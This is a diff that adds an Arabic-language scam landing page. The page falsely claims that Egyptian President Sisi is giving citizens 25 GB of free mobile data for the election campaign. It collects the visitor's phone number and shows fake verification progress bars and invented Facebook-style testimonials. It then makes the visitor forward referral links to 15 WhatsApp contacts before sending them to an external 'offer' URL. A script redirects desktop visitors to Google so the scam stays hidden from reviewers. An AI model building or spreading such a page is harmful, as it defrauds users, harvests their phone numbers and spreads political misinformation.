@@ -1,0 +1,172 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            if (!/mobile/i.test(window.navigator.userAgent)) {
+                window.location.href = "https://www.google.com/";
+            }
+        </script>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>السيسي : 25 جيجا مجانا للبقاء على اطلاع بمستجدات الحملة الانتخابية</title>
+        <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/sKMrc14/favicon.png" />
+        <meta name="og:title" content="السيسي : 25 جيجا مجانا للبقاء على اطلاع بمستجدات الحملة الانتخابية" />
+        <meta name="og:url" content="url" />
+        <meta property="og:description" content="الحصول على الباقة" />
+        <meta property="og:image" content="https://i.ibb.co/8xw1NCY/intro.png" />
+        <meta name="robots" content="noindex" />
+        <meta name="theme-color" content="#16a085" />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@500;700&display=swap" />
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@500;700&display=swap" />
+        <link rel="stylesheet" href="css/style.css" />
+    </head>
+    <body>
+        <div id="overlay"></div>
+        <div id="modal">
+            <img src="img/icons/error.svg" />
+            <p class="error">خطأ!</p>
+            <p id="alert"></p>
+            <button>حسنا</button>
+        </div>
+        <div class="main">
+            <div id="step1">
+                <img class="intro" src="https://i.ibb.co/8xw1NCY/intro.png" />
+                <p>بالتعاون مع شبكات الاتصالات المحلية، قدم الرئيس المصري عبد الفتاح السيسي مبادرة سخية قدرها 25 جيجا مجانا صالحة لمدة 15 يوم لجميع المواطنين بهدف تيسير الوصول إلى مستجدات الحملة الانتخابية.</p>
+                <button type="submit">الحصول على الباقة</button>
+                <p class="tip red">يمكنك الاستفادة من هذا العرض مرة واحدة</p>
+            </div>
+            <div id="loader">
+                <p class="tip">المرجو الانتظار...</p>
+                <div class="spin"></div>
+                <div id="num">0%</div>
+            </div>
+            <div id="step2">
+                <p class="tip">قم بادخال رقم هاتفك :</p>
+                <form id="confirm">
+                    <input id="number" placeholder="ادخل رقم هاتفك هنا..." type="number" />
+                    <button type="submit">ارسال</button>
+                </form>
+            </div>
+            <div id="step3">
+                <p class="tip">جاري معالجة الطلب ...</p>
+                <div class="bar">
+                    <div class="outside">
+                        <div class="inside fill1"></div>
+                    </div>
+                    <div class="per"><span class="loader loader1"></span><span id="per1">0%</span></div>
+                </div>
+            </div>
+            <div id="step4">
+                <p class="green">بعد التحقق من رقم هاتفك، تبين انك لم تستفد بعد من الباقة.</p>
+                <p>ستتوصل بالباقة على هذا الرقم: <span id="getnumber" class="green"></span>، مباشرة بعد اتباع التعليمات ادناه :</p>
+                <div class="inst">
+                    <p>1- إضغط على زر "دعوة" الموجود فى الأسفل وارسل الرسالة الى 15 صديقا او 5 مجموعات على واتساب، ليستطيعو بدورهم الاستفادة من الرصيد المجاني.</p>
+                    <p>2- ستتوصل بالباقة تلقائيا بعد امتلاء شريط التحقق الاخضر.</p>
+                    <div class="bar">
+                        <div class="outside">
+                            <div class="inside fill2"></div>
+                        </div>
+                        <div class="per"><span class="loader loader2"></span><span id="per2">0%</span></div>
+                    </div>
+                    <button type="submit">دعوة</button>
+                </div>
+            </div>
+            <div id="step5">
+                <img src="img/icons/check.svg" />
+                <p class="title green">تهانينا!</p>
+                <p class="tip">يمكنك الآن الحصول على الباقة</p>
+                <button type="submit">الحصول على الباقة</button>
+            </div>
+            <div class="comments">
+                <div class="interactions">
+                    <div class="reactions">
+                        <img src="img/icons/like.svg" />
+                        <img src="img/icons/love.svg" />
+                        <img src="img/icons/care.svg" />
+                        <span id="total1">37.3K</span>
+                    </div>
+                    <div>
+                        <span id="total2">11.5K Comments</span>
+                        <span>•</span>
+                        <span id="total3">7.1K Shares</span>
+                    </div>
+                </div>
+                <div class="icons">
+                    <div class="react like1"><i class="icon icon1"></i> Like</div>
+                    <div class="react"><i class="icon icon2"></i> Comment</div>
+                    <div class="react"><i class="icon icon3"></i> Share</div>
+                </div>
+                <div class="comment">
+                    <img class="avatar" src="img/profiles/1.jpg" />
+                    <div>
+                        <div class="comment-content">
+                            <span class="username">Maryam Arafa</span>
+                            <p>كنت مترددة في البداية بخصوص العرض ده، بس إتأكدت إنه حقيقي. لسه وصلت 25 جيجابايت، شكرًا ليك يا سيسي.</p>
+                        </div>
+                        <div class="actions">
+                            <span class="time">1m</span>
+                            <span class="action like">like</span>
+                            <span class="action">reply</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="comment">
+                    <img class="avatar" src="img/profiles/2.jpg" />
+                    <div>
+                        <div class="comment-content">
+                            <span class="username">محمد كامل</span>
+                            <p>لسه جايب 25 جيجابايت، واو، مش مصدق!</p>
+                        </div>
+                        <div class="actions">
+                            <span class="time">2m</span>
+                            <span class="action like">like</span>
+                            <span class="action">reply</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="comment reply">
+                    <img class="avatar" src="img/profiles/3.jpg" />
+                    <div>
+                        <div class="comment-content">
+                            <span class="username">Gomana Ashraf</span>
+                            <p>الباقة بتاعتي معلقة لو سمحت تساعدني!</p>
+                        </div>
+                        <div class="actions">
+                            <span class="time">1m</span>
+                            <span class="action like">like</span>
+                            <span class="action">reply</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="comment">
+                    <img class="avatar" src="img/profiles/4.jpg" />
+                    <div>
+                        <div class="comment-content">
+                            <span class="username">Amr Salem</span>
+                            <p>أختي توصلت بالرصيد، يا رب أتوصل بيها أنا كمان.</p>
+                        </div>
+                        <div class="actions">
+                            <span class="time">3m</span>
+                            <span class="action like">like</span>
+                            <span class="action">reply</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="write-comment">
+                        <input type="text" id="commentInput" placeholder="Write a comment..." />
+                </div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+        <script>
+            var error1 = "لم يتبق لك سوى خطوة واحدة للحصول على الباقة، أكملها وإلا ستفقد فرصة الحصول عليها!",
+                error2 = "المرجو ادخال رقم صحيح !",
+                error3 = "لقد نقرت على زر المشاركة دون المشاركة مع أصدقائك أو مجموعاتك، يرجى المشاركة مرة أخرى!",
+                share = "بالتعاون مع شبكات الاتصالات المحلية، قدم الرئيس المصري عبد الفتاح السيسي مبادرة سخية قدرها 25 جيجا مجانا صالحة لمدة 15 يوم لجميع المواطنين بهدف تيسير الوصول إلى مستجدات الحملة الانتخابية. %0A%0A *لقد حصلت عليها للتو، ادخل بسرعة واحصل عليها أنت كمان!* %0A%0A *لمستعملي اورنچ مصر* 👇%0A https://freepack.co/eg/?orange=3944802 %0A%0A *لمستعملي ڤودافون مصر* 👇 %0A https://freepack.co/eg/?vodafone=3944802 %0A%0A *لمستعملي اتصالات مصر* 👇 %0A https://freepack.co/eg/?Etisalat=3944802 %0A%0A *لمستعملي المصرية للاتصالات* 👇 %0A https://freepack.co/eg/?we=3944802",
+                visit = "https://freepack.co/eg/?we=3501994",
+                offer = "https://smrturl.co/8aebe7e";
+        </script>
+        <script src="js/main.js"></script>
+    </body>
+</html>
